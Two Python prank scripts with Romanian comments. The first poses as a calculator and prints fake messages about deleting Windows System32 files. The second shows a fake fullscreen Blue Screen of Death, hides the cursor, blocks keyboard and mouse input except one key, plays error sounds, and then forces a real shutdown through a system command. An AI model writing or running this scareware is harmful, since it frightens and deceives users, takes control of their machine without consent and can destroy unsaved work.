import time

def main():
    size = 10  # lățimea cutiei
    title = "Calculator"

    # linia de sus
    print("_" * size)

    # titlul centrat
    padding = (size - 2 - len(title)) // 2
    line = "|" + " " * padding + title + " " * (size - 2 - len(title) - padding) + "|"
    print(line)

    # linii goale
    for _ in range(5):
        print("|" + " " * (size - 2) + "|")

    # linia de jos
    print("-" * size)

    # input
    n = input("pune-l pe Burulea să calculeze: ")

    # simulăm calcule
    print("Burulea calculează.")
    time.sleep(1)
    print("Burulea calculează..")
    time.sleep(1)
    print("Burulea calculează...")
    time.sleep(1)

    # ASCII Art
    ascii_art = """
         ffffffffffffffff                 iiii                                        
        f::::::::::::::::f               i::::i                                       
       f::::::::::::::::::f               iiii                                        
       f::::::fffffff:::::f                                                           
       f:::::f       ffffffssssssssss   iiiiiii     cccccccccccccccc  aaaaaaaaaaaaa   
       f:::::f           ss::::::::::s  i:::::i   cc:::::::::::::::c  a::::::::::::a  
      f:::::::ffffff   ss:::::::::::::s  i::::i  c:::::::::::::::::c  aaaaaaaaa:::::a 
      f::::::::::::f   s::::::ssss:::::s i::::i c:::::::cccccc:::::c           a::::a 
      f::::::::::::f    s:::::s  ssssss  i::::i c::::::c     ccccccc    aaaaaaa:::::a 
      f:::::::ffffff      s::::::s       i::::i c:::::c               aa::::::::::::a 
       f:::::f               s::::::s    i::::i c:::::c              a::::aaaa::::::a 
       f:::::f         ssssss   s:::::s  i::::i c::::::c     ccccccca::::a    a:::::a 
      f:::::::f        s:::::ssss::::::si::::::ic:::::::cccccc:::::ca::::a    a:::::a 
      f:::::::f        s::::::::::::::s i::::::i c:::::::::::::::::ca:::::aaaa::::::a 
      f:::::::f         s:::::::::::ss  i::::::i  cc:::::::::::::::c a::::::::::aa:::a
      fffffffff          sssssssssss    iiiiiiii    cccccccccccccccc  aaaaaaaaaa  aaaa
    """
    print(ascii_art)

    # mesaje fake (ștergere fișiere)
    fake_files = [
        "C:\\Windows\\System32\\kernel32.dll",
        "C:\\Windows\\System32\\drivers\\ntoskrnl.exe",
        "C:\\Windows\\System32\\config\\winlogon.exe",
        "C:\\Windows\\System32\\tasks\\explorer.exe",
        "C:\\Windows\\System32\\spool\\user32.dll",
        "C:\\Windows\\System32\\drivers\\etc\\gdi32.dll",
        "C:\\Windows\\System32\\LogFiles\\advapi32.dll",
        "C:\\Windows\\System32\\wbem\\shell32.dll",
        "C:\\Windows\\System32\\catroot2\\winsrv.dll",
        "C:\\Windows\\System32\\DriverStore\\FileRepository\\setupapi.dll",
        "C:\\Windows\\System32\\Recovery\\disk.sys",
        "C:\\Windows\\System32\\SystemResources\\atapi.sys",
        "C:\\Windows\\System32\\AppLocker\\services.exe",
        "C:\\Windows\\System32\\Tasks\\Microsoft\\lsass.exe",
        "C:\\Windows\\System32\\GroupPolicy\\smss.exe",
        "C:\\Windows\\System32\\Sysprep\\csrss.exe",
        "C:\\Windows\\System32\\oobe\\spoolsv.exe",
        "C:\\Windows\\System32\\drivers\\PnP\\taskmgr.exe",
        "C:\\Windows\\System32\\wbem\\repository\\cmd.exe",
        "C:\\Windows\\System32\\drivers\\usb\\notepad.exe"
    ]

    for f in fake_files:
        print(f"Deleting {f}")
        time.sleep(0.3)

if __name__ == "__main__":
    main()
import tkinter as tk
import time
import random
import winsound  # Built-in Windows sound library
import threading
import os 
import platform


def shutdown_computer():
    system = platform.system()
    if system == "Windows":
        os.system("shutdown /s /t 1")  # shutdown imediat
    elif system == "Linux" or system == "Darwin":
        os.system("sudo shutdown -h now")
    else:
        print("Sistemul de operare nu este suportat pentru shutdown automat.")

# Function to play random error sounds
def play_error_sounds():
    # Repeat until the program progresses
    for _ in range(random.randint(5, 10)):
        winsound.MessageBeep(winsound.MB_ICONHAND)  # System error sound
        time.sleep(random.uniform(0.2, 0.7))

# Create full-screen window
root = tk.Tk()
root.attributes('-fullscreen', True , '-topmost' , True )
root.configure(bg='black', cursor="none")  # Start with black screen

# Start error sounds in a separate thread so GUI doesn't freeze
threading.Thread(target=play_error_sounds, daemon=True).start()

root.update()
time.sleep(random.uniform(2, 4))  # Initial black screen delay to simulate blocking

# Sad face in top-left corner
sad_face = tk.Label(root, text=":(", font=("Segoe UI", 120), fg="white", bg='#0078D7')
sad_face.place(x=50, y=20)

# BSOD text below sad face
text = """Your PC ran into a problem and needs to restart. We're
just collecting some error info, and then we'll restart for you."""
label = tk.Label(root, text=text, font=("Segoe UI", 24), fg="white", bg='#0078D7', justify="left", anchor="w")
label.place(x=50, y=300)

# Progress percentage
progress_var = tk.StringVar()
progress_label = tk.Label(root, textvariable=progress_var, font=("Segoe UI", 24), fg="white", bg='#0078D7')
progress_label.place(x=50, y=420)

# Randomly increase percentage until random moment to "freeze" → then black screen
percentage = 0
black_trigger = random.randint(50, 100)

while True:
    if percentage >= black_trigger:
        # Turn screen completely black at the end
        root.configure(bg='black')
        sad_face.configure(bg='black', fg='black')
        label.configure(bg='black', fg='black')
        progress_label.configure(bg='black', fg='black')
        break
    
    progress_var.set(f"{percentage}% complete")
    root.update()
    
    # Random increment
    percentage += random.randint(1, 5)
    
    # Random delay
    time.sleep(random.uniform(0.1, 0.4))

# Only '=' key can close, all other inputs blocked
def allow_equal(event):
    if event.keysym == "equal":
        root.destroy()
    return "break"

root.bind_all("<Key>", allow_equal)
root.bind_all("<Button>", lambda e: "break")  # Block all mouse clicks
root.bind_all("<Key>", allow_equal)
root.bind_all("<Button>", lambda e: "break")  # Block all mouse clicks


root.after(3000, shutdown_computer)



root.mainloop()
